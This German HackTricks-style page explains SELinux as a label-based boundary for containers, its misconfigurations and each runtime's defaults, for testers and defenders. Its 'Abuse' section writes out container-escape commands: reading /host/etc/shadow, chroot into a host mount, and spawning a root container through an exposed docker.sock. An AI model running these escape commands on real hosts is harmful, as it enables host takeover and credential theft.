# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Übersicht

SELinux ist ein **labelbasiertes Mandatory Access Control**-System. Jeder relevante Prozess und jedes relevante Objekt kann einen Sicherheitskontext tragen, und die Policy entscheidet, welche Domains mit welchen Typen und auf welche Weise interagieren dürfen. In containerisierten Umgebungen bedeutet dies normalerweise, dass die Runtime den Containerprozess innerhalb einer eingeschränkten Container-Domain startet und den Containerinhalt mit entsprechenden Typen labelt. Wenn die Policy ordnungsgemäß funktioniert, kann der Prozess möglicherweise die Objekte lesen und schreiben, mit denen sein Label erwartungsgemäß interagieren darf, während der Zugriff auf andere Host-Inhalte verweigert wird, selbst wenn diese Inhalte durch einen Mount sichtbar werden.

Dies ist eine der leistungsfähigsten hostseitigen Schutzmaßnahmen, die in gängigen Linux-Container-Deployments verfügbar sind. Sie ist besonders wichtig auf Fedora, RHEL, CentOS Stream, OpenShift und anderen SELinux-zentrierten Ökosystemen. In diesen Umgebungen wird ein Reviewer, der SELinux ignoriert, häufig missverstehen, warum ein scheinbar offensichtlicher Pfad zur Kompromittierung des Hosts tatsächlich blockiert wird.

## AppArmor Vs SELinux

Der einfachste Unterschied auf hoher Ebene besteht darin, dass AppArmor pfadbasiert ist, während SELinux **labelbasiert** ist. Das hat große Auswirkungen auf die Container-Sicherheit. Eine pfadbasierte Policy kann sich anders verhalten, wenn derselbe Host-Inhalt unter einem unerwarteten Mount-Pfad sichtbar wird. Eine labelbasierte Policy fragt stattdessen, welches Label das Objekt besitzt und was die Prozess-Domain damit tun darf. Das macht SELinux nicht einfach, aber es macht das System robust gegenüber einer Klasse von Annahmen über Pfad-Tricks, die sich Verteidiger in AppArmor-basierten Systemen manchmal unbeabsichtigt zunutze machen.

Da das Modell labelorientiert ist, sind die Handhabung von Container-Volumes und Entscheidungen zum Relabeling sicherheitskritisch. Wenn die Runtime oder der Operator Labels zu weitreichend ändert, um „Mounts funktionsfähig zu machen“, kann die Policy-Grenze, die die Workload eigentlich einschließen sollte, deutlich schwächer werden als beabsichtigt.

## Lab

Um zu überprüfen, ob SELinux auf dem Host aktiv ist:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Um vorhandene Labels auf dem Host zu überprüfen:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Um einen normalen Lauf mit einem zu vergleichen, bei dem die Kennzeichnung deaktiviert ist:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
Auf einem SELinux-aktivierten Host ist dies eine sehr praktische Demonstration, da sie den Unterschied zwischen einer Workload zeigt, die unter der erwarteten Container-Domain läuft, und einer, der diese Enforcement-Schicht entzogen wurde.

## Runtime Usage

Podman ist besonders gut auf SELinux abgestimmt, wenn SELinux Teil des Plattformstandards ist. Rootless Podman plus SELinux gehört zu den stärksten Mainstream-Container-Baselines, da der Prozess auf der Host-Seite bereits unprivilegiert läuft und weiterhin durch eine MAC-Richtlinie eingeschränkt wird. Docker kann SELinux ebenfalls verwenden, sofern dies unterstützt wird, obwohl Administratoren SELinux manchmal deaktivieren, um Probleme bei der Volume-Kennzeichnung zu umgehen. CRI-O und OpenShift stützen sich bei ihrer Container-Isolation stark auf SELinux. Kubernetes kann ebenfalls SELinux-bezogene Einstellungen bereitstellen, deren Nutzen hängt jedoch offensichtlich davon ab, ob das Betriebssystem des Nodes SELinux tatsächlich unterstützt und durchsetzt.

Die wiederkehrende Erkenntnis ist, dass SELinux kein optionales Extra ist. In den Ökosystemen, die darauf aufbauen, ist SELinux Teil der erwarteten Sicherheitsgrenze.

## Misconfigurations

Der klassische Fehler ist `label=disable`. Im Betrieb geschieht dies häufig, weil ein Volume-Mount verweigert wurde und die schnellste kurzfristige Lösung darin bestand, SELinux aus der Gleichung zu entfernen, anstatt das Kennzeichnungsmodell zu korrigieren. Ein weiterer häufiger Fehler ist die falsche Neukennzeichnung von Host-Inhalten. Umfassende Relabeling-Vorgänge können die Anwendung zwar funktionsfähig machen, aber auch den Umfang dessen, worauf der Container zugreifen darf, weit über die ursprüngliche Absicht hinaus erweitern.

Außerdem ist es wichtig, **installiertes** SELinux nicht mit **effektivem** SELinux zu verwechseln. Ein Host kann SELinux unterstützen und sich trotzdem im permissive mode befinden, oder die Runtime startet die Workload möglicherweise nicht unter der erwarteten Domain. In diesen Fällen ist der Schutz deutlich schwächer, als es die Dokumentation vermuten lässt.

## Abuse

Wenn SELinux für die Workload fehlt, sich im permissive mode befindet oder weitgehend deaktiviert wurde, lassen sich vom Host gemountete Pfade wesentlich leichter missbrauchen. Derselbe bind mount, der ansonsten durch Labels eingeschränkt wäre, kann dann zu einem direkten Weg auf Host-Daten oder zur Änderung des Hosts werden. Dies ist besonders relevant in Kombination mit beschreibbaren Volume-Mounts, Container-Runtime-Verzeichnissen oder betrieblichen Abkürzungen, durch die aus Bequemlichkeit sensible Host-Pfade freigegeben wurden.

SELinux erklärt häufig, warum ein allgemeines Breakout-Writeup auf einem Host sofort funktioniert, auf einem anderen jedoch wiederholt scheitert, obwohl die Runtime-Flags ähnlich aussehen. Die fehlende Komponente ist oft weder ein Namespace noch eine Capability, sondern eine Label-Grenze, die intakt geblieben ist.

Die schnellste praktische Prüfung besteht darin, den aktiven Context zu vergleichen und anschließend gemountete Host-Pfade oder Runtime-Verzeichnisse zu testen, die normalerweise durch Labels eingeschränkt wären:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Ist ein Host-Bind-Mount vorhanden und wurde das SELinux-Labeling deaktiviert oder geschwächt, kommt es häufig zuerst zu einer Offenlegung von Informationen:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Wenn der Mount beschreibbar ist und der Container aus Sicht des Kernels effektiv als Host-Root gilt, besteht der nächste Schritt darin, eine kontrollierte Änderung am Host zu testen, statt zu raten:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
Auf SELinux-fähigen Hosts kann der Verlust von Labels rund um Verzeichnisse für Laufzeitstatus ebenfalls direkte Privilege-Escalation-Pfade eröffnen:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Diese Befehle ersetzen keine vollständige Escape-Kette, machen jedoch sehr schnell deutlich, ob SELinux den Zugriff auf Host-Daten oder die Änderung von Dateien auf der Host-Seite verhindert hat.

### Vollständiges Beispiel: SELinux deaktiviert + beschreibbarer Host-Mount

Wenn das SELinux-Labeling deaktiviert ist und das Host-Dateisystem unter `/host` beschreibbar eingebunden wurde, wird ein vollständiger Host-Escape zu einem normalen Fall von bind-mount abuse:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Wenn `chroot` erfolgreich ist, arbeitet der Containerprozess nun aus dem Host-Dateisystem heraus:
```bash
id
hostname
cat /etc/passwd | tail
```
### Vollständiges Beispiel: SELinux deaktiviert + Runtime-Verzeichnis

Wenn die Workload nach der Deaktivierung der Labels einen Runtime-Socket erreichen kann, kann der Escape an die Runtime delegiert werden:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
Die relevante Beobachtung ist, dass SELinux häufig die Kontrolle war, die genau diese Art von Zugriff auf Host-Pfade oder Runtime-Zustände verhinderte.

## Checks

Das Ziel der SELinux-Checks besteht darin zu bestätigen, dass SELinux aktiviert ist, den aktuellen Security Context zu identifizieren und zu prüfen, ob die für dich relevanten Dateien oder Pfade tatsächlich durch Labels eingeschränkt sind.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Was ist hier interessant:

- `getenforce` sollte idealerweise `Enforcing` zurückgeben; `Permissive` oder `Disabled` verändert die Bedeutung des gesamten SELinux-Abschnitts.
- Wenn der Kontext des aktuellen Prozesses unerwartet oder zu weit gefasst aussieht, läuft die Workload möglicherweise nicht unter der vorgesehenen Container-Policy.
- Wenn hostgemountete Dateien oder Runtime-Verzeichnisse Labels besitzen, auf die der Prozess zu frei zugreifen kann, werden bind mounts deutlich gefährlicher.

Bei der Überprüfung eines Containers auf einer SELinux-fähigen Plattform sollte Labeling nicht als nebensächliches Detail betrachtet werden. In vielen Fällen ist es einer der Hauptgründe, warum der Host noch nicht kompromittiert ist.

## Runtime-Standards

| Runtime / Plattform | Standardstatus | Standardverhalten | Häufige manuelle Abschwächung |
| --- | --- | --- | --- |
| Docker Engine | Vom Host abhängig | SELinux-Trennung ist auf SELinux-fähigen Hosts verfügbar, aber das genaue Verhalten hängt von der Konfiguration des Hosts/Daemons ab | `--security-opt label=disable`, umfassendes Relabeling von bind mounts, `--privileged` |
| Podman | Auf SELinux-Hosts üblicherweise aktiviert | SELinux-Trennung ist auf SELinux-Systemen normalerweise Bestandteil von Podman, sofern sie nicht deaktiviert wurde | `--security-opt label=disable`, `label=false` in `containers.conf`, `--privileged` |
| Kubernetes | Auf Pod-Ebene im Allgemeinen nicht automatisch zugewiesen | SELinux-Unterstützung ist vorhanden, aber Pods benötigen normalerweise `securityContext.seLinuxOptions` oder plattformspezifische Defaults; Runtime- und Node-Unterstützung sind erforderlich | schwache oder zu weit gefasste `seLinuxOptions`, Ausführung auf permissiven/deaktivierten Nodes, Platform-Policies, die Labeling deaktivieren |
| CRI-O / OpenShift-ähnliche Deployments | Üblicherweise stark darauf angewiesen | SELinux ist in diesen Umgebungen häufig ein zentraler Bestandteil des Node-Isolationsmodells | benutzerdefinierte Policies, die den Zugriff zu stark erweitern, Deaktivierung des Labelings aus Kompatibilitätsgründen |

SELinux-Defaults hängen stärker von der Distribution ab als seccomp-Defaults. Auf Fedora/RHEL/OpenShift-ähnlichen Systemen ist SELinux häufig zentral für das Isolationsmodell. Auf Nicht-SELinux-Systemen ist es schlicht nicht vorhanden.
{{#include ../../../../banners/hacktricks-training.md}}
